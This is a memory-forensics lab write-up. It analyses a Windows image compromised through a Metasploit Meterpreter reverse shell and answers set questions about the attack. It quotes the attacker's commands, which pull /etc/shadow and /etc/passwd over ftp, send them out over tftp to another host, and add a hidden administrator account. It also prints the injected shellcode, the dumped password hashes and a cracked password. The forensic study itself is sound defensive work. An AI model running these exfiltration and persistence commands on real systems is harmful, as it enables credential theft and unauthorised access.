# Writeup


Using plugins `cmdscan` and `consoles` we found evidence of an attacker trying to create a new user and add it to the local administrators group. The attacker also tried to exfiltrate the `shadow` and `passwd` files using `ftp` and `tftp` commands.

## Commands executed in a console

With the `consoles` command, we discover that a console named `Metasploit Courtesy Shell (TM)` was used to execute very suspicious commands, and that the PID associated to this console is `440` :


```
[...]

OriginalTitle: Metasploit Courtesy Shell (TM)
Title: Metasploit Courtesy Shell (TM)
AttachedProcess: cmd.exe Pid: 440 Handle: 0x5b4

[...]

cd C:\
mkdir system32
cd system32
ftp 192.168.174.128

Connected to 192.168.174.128.                                                   
220 ProFTPD 1.3.4a Server (Debian) [::ffff:192.168.174.128]                     
User (192.168.174.128:(none)): root                                             
331 Password required for root                                                  
Password:                                                                       
230 User root logged in                                                         
ftp> get /etc/shadow                                                            
200 PORT command successful                                                     
150 Opening ASCII mode data connection for /etc/shadow (866 bytes)              
226 Transfer complete                                                           
ftp: 891 bytes received in 0.02Seconds 55.69Kbytes/sec.                         
ftp> get /etc/passwd                                                            
200 PORT command successful                                                     
150 Opening ASCII mode data connection for /etc/passwd (1033 bytes)             
226 Transfer complete                                                           
ftp: 1058 bytes received in 0.00Seconds 1058000.00Kbytes/sec.                                                                               
ftp> quit                                                                       
221 Goodbye.    

tftp 192.168.1.104 put shadow
Transfer successful: 891 bytes in 1 second, 891 bytes/s

tftp 192.168.1.104 put passwd
Transfer successful: 1058 bytes in 1 second, 1058 bytes/s   

net user admin * /add
Type a password for the user:                                                   
Retype the password to confirm:                                                 
The command completed successfully.

net localgroup Administrators admin /add
The command completed successfully.  
```

## Process tree

Using `pstree` we can see that the `cmd.exe` (PID 440) process that executed those commands is running as a child of `svchost.exe` (Pid 1136).

```
Name                                  Pid   PPid   Thds   Hnds
----------------------------------- ------ ------ ------ ------
.. 0x89953020:csrss.exe                684    620     11    409
.. 0x8969f020:winlogon.exe             708    620     22    522
... 0x8998b680:wpabaln.exe            1428    708      1     58
... 0x8994dca8:services.exe            752    708     16    268
.... 0x895213c0:svchost.exe            132    752      6     88
.... 0x8989a980:vmtoolsd.exe           272    752      8    268
.... 0x8994f458:vmacthlp.exe           924    752      1     25
.... 0x899a1a00:svchost.exe           1184    752      6     70
.... 0x89b60998:svchost.exe           1284    752     14    195
.... 0x896a1b10:svchost.exe            936    752     19    202
.... 0x895e9618:svchost.exe            996    752     10    238
.... 0x89679608:alg.exe               1768    752      6    101
.... 0x89a54650:spoolsv.exe           1644    752     14    145
.... 0x89a90da0:svchost.exe           1136    752     68   4423
..... 0x89985c08:wscntfy.exe          1588   1136      1     28
..... 0x8950a020:cmd.exe               440   1136      1     33
..... 0x8992fb08:wmiadap.exe           364   1136      5    172

```

## Network connections

So now the `svchost.exe` (Pid 1136) is suspicious, let's have a look at it.

Looking at the network connections using `sockets` we can see that the `svchost.exe` (Pid 1136) is actively listening on all interfaces on port 4444.

```

Offset(V)       PID   Port  Proto Protocol        Address        
---------- -------- ------ ------ --------------- ---------------
0x896b87c0     1136    123     17 UDP             192.168.174.148
0x896e36d8     1136    123     17 UDP             127.0.0.1      
0x898ad978     1136   4444      6 TCP             0.0.0.0        

```

Knowing that `4444` is a common port used by `msf` (metasploit) we can assume that this process is even more malicious.

From now we can assume that it is most likely a reverse shell, so we can use `connscan` to look for connections...

Here you go...

```
Offset(P)  Local Address             Remote Address            Pid
---------- ------------------------- ------------------------- ---
0x0986ae68 192.168.174.148:1037      192.168.174.128:20        908
0x0986bd30 192.168.174.148:4444      192.168.174.1:58719       1136
0x098aa128 192.168.174.148:1038      192.168.174.128:139       0
````

We can see :

- The connection between the reverse shell and the attacker (192.168.174.1)
- The connection between the infected machine and the FTP server where data is being exfiltrated from (192.168.174.128:20)

## Code injection

So we can assume that the attacker is using a reverse shell to connect to the machine.

The attacker is most likely using `msf` (metasploit) to get a reverse shell, so we can assume that the attacker is using a `meterpreter` shell.

After quick research about how `meterpreter` works, we found out that "Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime." [https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

Let's use `malfind` to explore the potential strange VADS in here.

Hooray ! We found something interesting...

```
Process: svchost.exe Pid: 1136 Address: 0x2df0000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 109, MemCommit: 1, PrivateMemory: 1, Protection: 6

4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 89   MZ.....[REU.....
0e 00 00 ff d3 89 c3 57 68 04 00 00 00 50 ff d0   .......Wh....P..
68 e0 1d 2a 0a 68 05 00 00 00 50 ff d3 00 00 00   h..*.h....P.....
00 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00   ................

0x0000000002df0000 4d               DEC EBP
0x0000000002df0001 5a               POP EDX
0x0000000002df0002 e800000000       CALL 0x2df0007
0x0000000002df0007 5b               POP EBX
0x0000000002df0008 52               PUSH EDX
0x0000000002df0009 45               INC EBP
0x0000000002df000a 55               PUSH EBP
0x0000000002df000b 89e5             MOV EBP, ESP
0x0000000002df000d 81c3890e0000     ADD EBX, 0xe89
0x0000000002df0013 ffd3             CALL EBX

[...]

```

Based on the criteria seen in class :

* Full commited page \checkmark
* RWX page \checkmark
* Private memory \checkmark
* No mapped file (VadS) \checkmark
* MZ header \checkmark

We can also see that the displayed assembly code is coherent :

- The code does some classical stack register manipulation (`DEC EBP`  /  `MOV EBP, ESP`  /  ...)
- The code loads an address on the stack, computes an offset from it and then calls the function at this offset (`POP EBX`  /  `ADD EBX, 0xe89`  /  `CALL EBX`)

So `svchost.exe` (Pid 1136) is no more a suspicious process, it is most likely a malicious one.

We dumped the injected exectuable at `0x2df0000`, we ran `strings` on it and we found out that it is really a `meterpreter` shell :

here's an extract of some strings that "proves" that it is a `meterpreter` shell :

* `ReflectiveLoader` -> as described in [https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) the stager uses ReflectiveLoader to load the DLL into memory.
* ImpersonateLoggedOnUser  -> this is a typical function used by `meterpreter` to impersonate the user.

## Files

Using `mftparser` we confirm that the `shadow` and `passwd` have indeed been downloaded on in a `C:\system32` folder.

```
[...]

***************************************************************************
MFT entry found at offset 0x1e3f6800
Attribute: In Use & File
Record Number: 11222
Link count: 1


$STANDARD_INFORMATION
Creation                       Modified                       MFT Altered                    Access Date                    Type
------------------------------ ------------------------------ ------------------------------ ------------------------------ ----
2013-08-15 22:57:26 UTC+0000 2013-08-15 22:57:26 UTC+0000   2013-08-15 22:57:26 UTC+0000   2013-08-15 22:57:26 UTC+0000   Archive

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2013-08-15 22:57:26 UTC+0000 2013-08-15 22:57:26 UTC+0000   2013-08-15 22:57:26 UTC+0000   2013-08-15 22:57:26 UTC+0000   system32\shadow

[...]


***************************************************************************
MFT entry found at offset 0x1e3f6c00
Attribute: In Use & File
Record Number: 11223
Link count: 1


$STANDARD_INFORMATION
Creation                       Modified                       MFT Altered                    Access Date                    Type
------------------------------ ------------------------------ ------------------------------ ------------------------------ ----
2013-08-15 22:57:32 UTC+0000 2013-08-15 22:57:32 UTC+0000   2013-08-15 22:57:32 UTC+0000   2013-08-15 22:57:32 UTC+0000   Archive

$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2013-08-15 22:57:32 UTC+0000 2013-08-15 22:57:32 UTC+0000   2013-08-15 22:57:32 UTC+0000   2013-08-15 22:57:32 UTC+0000   system32\passwd

[...]
```

## Persistence

We can confirm the existence of the `admin` account created by the attacker using the `hashdump` command :

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:4c55cffcea59c80fdbfa33a48284b19f:620957181ac115bf27011183826f684a:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:350d1d7052e87285ad7c2010ca897151:::
admin:1003:94df0a430bd39eb7ccf9155e3e7db453:8a33e55295b401e4240364c42b22d90c:::
```

As the `admin` account has an LM hash, it is easy to crack using hashcat. We get the password : 'whistle123'.

## Analysis conclusion

In short, the attacker used `metasploit` to get a `meterpreter` reverse shell, the process where it has been injected is `svchost.exe` (Pid 1136).

The attacker then ran a `cmd` from there, he connected himself as root via `ftp` to a remote machine (192.168.174.128) where he downloaded `shadow` and `passwd` to the infected machine (192.168.174.148). He then used `tftp` to exfiltrate the files to an other machine (192.168.1.104). 

He then created an `admin` account to achieve persistence on the machine (he can now on connect himself with the `admin` account)

# Questions

## What tool was used to compromise the system?

The attacker used `metasploit` to get a `meterpreter` reverse shell on the victim machine (192.168.174.148).

The evidences are :

- The fact that a console named `Metasploit Courtesy Shell (TM)` was running on the machine
- The fact that its parent process has an open connection using the port 4444, which is typical of a `meterpreter` shell.
- The fact that we found evidence of code injection with content matching the characteristics of a `meterpreter` shell.

## What was the IP address of the attacker's machine?

The attacker's machine IP address is `192.168.174.1`. The evidence for this is that this is the address of the machine connected to the reverse shell.

The IP address of the machine where the exfiltrated files were sent is `192.168.1.104`.

Both IP addresses are local addresses. This means that either the attacker is on the same network as the victim, or that the attacker has already compromised some machines on the network and is using them as a pivot.

## What directory was created to store the files before exfiltration?

The attacker created a directory called `system32` in the `C:\` directory, where he stored the `shadow` and `passwd` files before exfiltration.

The evidences are :

- The commands executed by the attacker in the console
- The fact that the `C:\system32\shadow` and `C:\system32\passwd` files exist in the MFT

## Where was data exfiltrated from?

The attacker exfiltrated data from a Debian `ftp` server running on (192.168.174.128)

The evidences are :

- The commands executed by the attacker in the console
- The network connection between the victim machine and the server at 192.168.174.128 on port 20.

## How was exfiltration performed?
From the infected machine, the attacker connected himself to the `ftp` server via `ftp` and downloaded the `shadow` and `passwd` files to the infected machine. He then used `tftp` to transfer the files to his machine (192.168.1.104).

The evidences for this are the same as the ones for the previous questions.

## How was persistence maintained?

The attacker created an `admin` account to achieve persistence on the machine (he can now on connect himself with the `admin` account)

The evidences are :

- The commands executed by the attacker in the console
- The fact that the `admin` account exists in the registry, with the password 'whistle123'